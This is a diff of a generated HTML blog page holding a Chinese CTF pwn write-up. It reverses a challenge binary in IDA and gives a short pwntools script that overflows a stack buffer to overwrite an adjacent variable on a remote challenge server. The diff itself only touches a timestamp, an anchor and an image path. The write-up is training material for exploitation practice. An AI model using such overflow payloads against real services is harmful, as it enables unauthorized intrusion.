@@ -180,7 +180,7 @@
       <span class="post-meta-item-text">Posted on</span>
       
 
-      <time title="Created: 2021-10-27 21:56:07 / Modified: 22:52:56" itemprop="dateCreated datePublished" datetime="2021-10-27T21:56:07+08:00">2021-10-27</time>
+      <time title="Created: 2021-10-27 21:56:07 / Modified: 22:57:24" itemprop="dateCreated datePublished" datetime="2021-10-27T21:56:07+08:00">2021-10-27</time>
     </span>
 
   
@@ -193,7 +193,11 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <p>首先，我们看到题目：</p>
+          <span id="more"></span>
+
+
+
+<p>首先，我们看到题目：</p>
 <p><img src="image-20211027220220140.png" alt="image-20211027220220140"></p>
 <p>下载附件，ida反编译并找出主函数：</p>
 <p><img src="image-20211027224506556.png" alt="image-20211027224506556"></p>
@@ -207,7 +211,7 @@
 <p><img src="image-20211027224732285.png" alt="image-20211027224732285"></p>
 <p>发现这两个变量的偏移量为6C-68 = 4（16进制）</p>
 <p>因此我们可以构造payload = ‘aaaa’+p64(1853186401)，具体脚本如下：</p>
-<p><img src="C:\blog\source_posts\Note.assets\image-20211027224758038.png" alt="image-20211027224758038"></p>
+<p><img src="image-20211027224758038.png" alt="image-20211027224758038"></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;111.200.241.244&quot;</span>,<span class="string">&#x27;63031&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;aaaa&#x27;</span>+p64(<span class="number">1853186401</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;lets get helloworld for bof&quot;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 
